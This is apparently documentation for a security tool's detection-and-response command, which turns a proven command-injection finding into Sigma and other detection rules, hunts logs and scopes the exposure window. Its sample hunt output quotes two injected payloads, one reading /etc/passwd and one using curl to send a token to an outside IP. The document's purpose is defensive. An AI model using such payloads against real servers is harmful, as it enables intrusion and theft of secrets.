# Detection and response: from a proven vulnerability to a production defense

**Maturity:** Preview. See the [capability registry](../capabilities.yaml) and the [maturity model](../how-it-works/maturity-model.md).

**Status: new. Everything here runs locally.** The loop reads files and runs a bounded search. It makes no network call and no
model call, so production logs never leave the machine.

## What problem this solves

A confirmed vulnerability is two questions: *how do I fix it* (the fix flow already answers that) and *did anyone use it, and
will I notice if it comes back*. `dnr` answers the second from facts the proof already established:

```
Find -> Prove -> Hunt -> Scope -> Fix -> Verify -> Detect
```

* **Generate** a detection from the proof: the endpoint, the vulnerable parameter, the kind of payload.
* **Validate** it before it is enabled: synthetic exploit requests must fire it, lookalikes must not.
* **Hunt** historical logs for requests that have the shape of the exploit.
* **Scope** the exposure window: when the flaw entered the code, when a build containing it first ran, when the fix was deployed,
  and which part of that span your telemetry actually covers.
* **Keep** the rule after the fix, so a recurrence is detectable.

## What a detection can and cannot say

A detection is built only from what the proof established. It describes the SHAPE of an exploit of this class (for example,
a shell metacharacter followed by a command in the `filename` field of `POST /api/export`). It contains no attacker address, no
domain, no file hash and no user agent, because a proof never observed one and the format has nowhere to put one. If the proof
did not record an endpoint, no request-level rule is generated; the limitation is stated rather than guessed around.

## Prerequisites

The reproducer carries an optional `attack` block saying how the vulnerable operation is reached. The runner never reads it, so it
cannot change a proof's result:

```json
{"attack": {"method": "POST", "path": "/api/export", "parameter": "filename", "location": "body", "payloadClass": "command-injection", "sink": "execSync()"}}
```

Unknown keys are refused. `payloadClass` is one of `sql-injection`, `command-injection`, `path-traversal`, `ssrf`,
`deserialization`, `file-write`, `buffer-overflow`, `auth-bypass`; it is optional when the finding's CWE already names one.

## Prove, then generate

```
$ agentic-security triage exploit F1 --prove --reproducer repro.json
Finding: F1
Evidence: EXPLOIT_CONFIRMED
Oracle: command_execution
Reproductions: 3/3 (required 3)
Independent replay: confirmed
Environment: local-confined (lower assurance)
Completeness: DEGRADED
Duration: 3.8s
Degraded: lower-assurance-local-confinement
```

```
$ agentic-security dnr generate F1 --format sigma
Detection det-dbd33045c7b7 for F1: command-injection (exploit-confirmed, confidence 0.9)
Validation: VALIDATED (13/13 synthetic cases); recurrence rule enabled

title: "Exploitation attempt: command-injection against POST /api/export"
id: "dbd33045-c7b7-1404-b88f-bd61e907472f"
status: experimental
description: "shell metacharacters followed by a command cause the server to run an attacker-chosen command. Generated from finding F1 (exploit-confirmed)."
references:
  - "finding:F1"
author: agentic-security
logsource:
  category: webserver
detection:
  selection_request:
    cs-method: "POST"
    cs-uri-stem: "/api/export"
  selection_payload:
    request-body|re|i: "(?:(?:;|\\||&&|...)"
  condition: selection_request and selection_payload
falsepositives:
  - "A legitimate client that sends this payload shape to the same endpoint (a security scanner, a penetration test)."
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - "cwe.78"
```

Formats: `sigma`, `http` (a generic JSON detection), `waf` (a ModSecurity-style suggestion that is always detect-only), `log-query`
(a structured query), `yara` (only for the deserialization class, where there is content to match), and the P1 text renderers `spl`
(Splunk), `kql` (Microsoft Sentinel), `cloudwatch` (Logs Insights), `elastic` (an Elasticsearch query body over ECS fields), `yaral` (Google SecOps) and `datadog` (a Cloud SIEM rule, created disabled). A format that cannot honestly describe the finding says why
instead of emitting a rule that would never fire: KQL and CloudWatch cannot see a request body, so they decline a body parameter.
`--out <dir>` writes every applicable format.

A detection is **enabled** only when it validates. Validation runs the same evaluator the hunt uses against synthetic events built
from the proof's facts: the exploit payloads must fire it, and benign values, the same payload on another method, another path or
another field must not.

## Hunt historical logs

```
$ agentic-security dnr hunt F1 --logs logs/app.jsonl
Hunt: OBSERVED
Logs: 1 file(s), 75/75 lines parsed, 2024-03-10 to 2024-03-23
Matches: 2 (first 2024-03-14T02:13:44.000Z, last 2024-03-14T02:14:09.000Z)
  2024-03-14T02:13:44.000Z POST /api/export [body:filename] x; cat /etc/passwd
  2024-03-14T02:14:09.000Z POST /api/export [body:filename] $(curl http://198.51.100.9/?token=[REDACTED]
2 request(s) have the shape of this exploit. A match is a lead to investigate, not proof of compromise: a scanner or a test could produce the same request.
(exit 10)
```

Understood log shapes: Apache/nginx common and combined access logs, and JSON lines (including Envoy and structured application
logs). Reads are bounded by file count, file size, total size, line length, line count and time; any limit that is reached is
reported and turns a negative answer into INCONCLUSIVE.

| Verdict | Meaning | Exit code |
|---|---|---|
| `NOT_OBSERVED` | Nothing matched, and the logs were good enough to look. | 0 |
| `OBSERVED` | At least one request has the exploit's shape. A lead, not proof of compromise. | 10 |
| `INCONCLUSIVE` | Nothing matched, but the evidence could not support a negative. | 11 |
| `TELEMETRY_UNAVAILABLE` | No readable request records. | 12 |

`NOT_OBSERVED` never means "not exploited"; every result carries `notExploitedClaim: false` and says so. A log that cannot show the
vulnerable field cannot clear it:

```
$ agentic-security dnr hunt F1 --logs logs/incomplete
Hunt: INCONCLUSIVE
Logs: 1 file(s), 75/75 lines parsed, 2024-03-10 to 2024-03-23
Caveat: 45 event(s) lacked a field this detection needs (body), so they could not be judged
No matching request was found, but the logs could not support a negative answer. See the caveats; do not read this as "not exploited".
(exit 11)
```

```
$ agentic-security dnr hunt F1 --logs logs/clean
Hunt: NOT_OBSERVED
Logs: 1 file(s), 70/70 lines parsed, 2024-03-10 to 2024-03-23
No matching request was found in the searched logs. This does not establish that the vulnerability was not exploited: exploitation could have used a route, encoding or time these logs do not cover.
(exit 0)
```

Matched values are redacted before they are printed or stored (credentials, tokens, e-mail addresses, card-like numbers), and a
fingerprint stands in for the value.

## Scope the exposure window

```
$ agentic-security dnr window F1 --deployments deploys.json --fix-commit <fix-sha>
Vulnerability introduced: 2024-03-03
First vulnerable deployment: 2024-03-04
Fix committed: 2024-03-21
Fix deployed: 2024-03-23
Telemetry available: 2024-03-10 to 2024-03-23

Observable exposure window: 2024-03-10 to 2024-03-23
Exposed but not observable: 2024-03-04 to 2024-03-10 (before telemetry began)

The observable window is the part of the exposure that telemetry covers. Exposure outside it is unobserved, which is not the same as unexploited.
(exit 0)
```

Every date has a source: the finding's provenance, a deployment record you supply (`[{"commit": "...", "deployedAt": "...",
"environment": "prod"}]`), a git commit, or the telemetry a hunt saw. An input that is missing is listed as unknown and the status
becomes `partial` or `unavailable`. Exposure before telemetry began is reported as exposed but not observable. A deployment git
cannot resolve is listed, never assumed vulnerable or safe.

## Fix, verify, and keep the rule

```
$ agentic-security fix --finding F1 --apply --require-proof --reproducer repro.json
Pre-patch exploit: PASS
Post-patch exploit: BLOCKED
Regression tests: PASS (degraded)
Security rescan: PASS
Completeness: DEGRADED (tests: skipped (no-test-command-detected); lower-assurance-local-confinement)

Evidence: FIX_VERIFIED
✓ applied fix fix-mvdzkadk-202e38  (file: app.mjs)
  backup: .agentic-security/fix-history/fix-mvdzkadk-202e38.bak
  verified: yes, but NOT fully verified — rescan clean, no new medium+ finding; tests: skipped (no-test-command-detected)
  revert with: agentic-security undo
```

```
$ agentic-security dnr status F1
Finding F1

[x] FIND    Confirmed vulnerability: command injection (app.mjs:4)
[x] PROVE   Exploit reproduced 3/3, independent replay confirmed
[x] HUNT    13 day(s) of telemetry searched, 2 matching event(s) observed; other hunt(s): NOT_OBSERVED, INCONCLUSIVE
[x] FIX     DEGRADED verified remediation
[x] VERIFY  Original exploit blocked
[x] DETECT  Recurrence rule enabled (det-dbd33045c7b7)

[x] done   [~] partial or unconfirmed   [ ] missing
```

The detection and the proof link to each other (`proof show` prints the detection), and the detection stays after the fix.
An earlier hunt that observed matches is not hidden by a later hunt over different logs that did not.

## Commands

```bash
agentic-security dnr generate <finding-id> [--format <name>|all] [--out <dir>] [--allow-unproven] [--json]
agentic-security dnr validate <finding-id>
agentic-security dnr hunt <finding-id> --logs <file-or-dir> [--since <iso>] [--until <iso>]
agentic-security dnr window <finding-id> --deployments <file> [--fix-commit <sha>] [--environment <name>]
agentic-security dnr show <finding-id>
agentic-security dnr status <finding-id>
```

`--allow-unproven` builds a lower-confidence detection from the static finding alone; it is labelled `static-only` and carries a
limitation saying the exploit was not executed.

## Output schema

Records live under `.agentic-security/dnr/<finding>/` as `<kind>-<digest>.json`, each with its own `recordDigest` (a record that no longer
matches is returned flagged and never trusted) and encrypted per the encryption policy. Kinds: `detection` (the detection IR,
`agentic-security/detection-ir`: finding id, CWE and family, attack behaviour, endpoint, payload class, affected operation, process, network and
database effect, confidence, evidence references, a content `digest` and a derived `id` of the form `det-` plus 12 hex characters, plus the
validation result), `hunt` (`verdict`, `logs` read with parse and byte counts, `window`, `coverage` including which required fields were
present, `matches` with a count, first and last seen and redacted samples, `caveats`, and a plain-language `statement`), `window` (the
exposure window with every unknown listed) and `fix` (the remediation closure). `dnr hunt` exit codes: 10 `OBSERVED`, 0 `NOT_OBSERVED`, 11
`INCONCLUSIVE`, 12 `TELEMETRY_UNAVAILABLE`.

## Troubleshooting

| What you see | Why, and what to do |
|---|---|
| `INCONCLUSIVE` | The logs could not show the thing: a required field (for example the query string or the response status) was absent from some or all lines, a parse failure rate was too high, a read was cut off, or lines had no usable timestamp. `caveats` and `coverage.fieldAvailability` say which. It is never read as "not exploited". |
| `TELEMETRY_UNAVAILABLE` | There was nothing to read: no log files, or none in a format the reader understands. Supported: common and combined access logs and JSON lines. |
| `NOT_OBSERVED` | The searched window, in the logs that were readable, contained no matching event. It does not mean the vulnerability was not exploited elsewhere or outside the window. |
| A format prints `not applicable (...)` | That target cannot express the finding exactly (for example KQL and CloudWatch cannot see a request body; Elastic uses Lucene regular expressions without anchors or word boundaries; Datadog has no regular expressions). The reason is the output, not a gap in the tool. Use `sigma`, `http` or `log-query`, which cover every class. |
| `dnr generate` refuses | The proof is not a confirmed exploit, or the reproducer carries no attack facts. Prove it first (`triage exploit <id> --prove`); `--allow-unproven` generates a clearly labelled lower-confidence detection. |
| Validation fails: a positive did not fire or a look-alike did | The IR and the generated rule disagree. This is checked with the same evaluator the hunt uses, so fix the IR (the reproducer's attack facts), not the threshold. |
| `refusing to write: the detection id is not in its derived form` | A detection record on disk carries an id that is not `det-` plus 12 hex characters, so it will not be used to name a file. Regenerate it. |
| A hunt prints samples with `[redacted]` | Passwords, tokens and secrets are redacted before anything is stored or printed, and a value fingerprint stands in for the value. |

## Not built

* Every remote SIEM integration (the PRD's P1 list asks for those to be opt-in and read-only). All renderers are text; none connects
  anywhere.
* The Elastic, YARA-L and Datadog renderers translate exactly or say why not, which makes them narrow. Elastic uses Lucene regular
  expressions (no anchors, word boundaries or look-around), YARA-L sees the whole URL, and Datadog has wildcards but no regular
  expressions. Most payload classes are therefore reported as not expressible there; the structural cases (authentication bypass,
  oversized values) render. The syntax of these three was not run against a live Elastic, Google SecOps or Datadog.
* An MCP tool for the loop.
* Hunting compressed logs (`.gz` and friends are reported as skipped, which makes the verdict INCONCLUSIVE).
* Payload classes beyond the eight above. A finding of another class gets no detection rather than a guessed one.
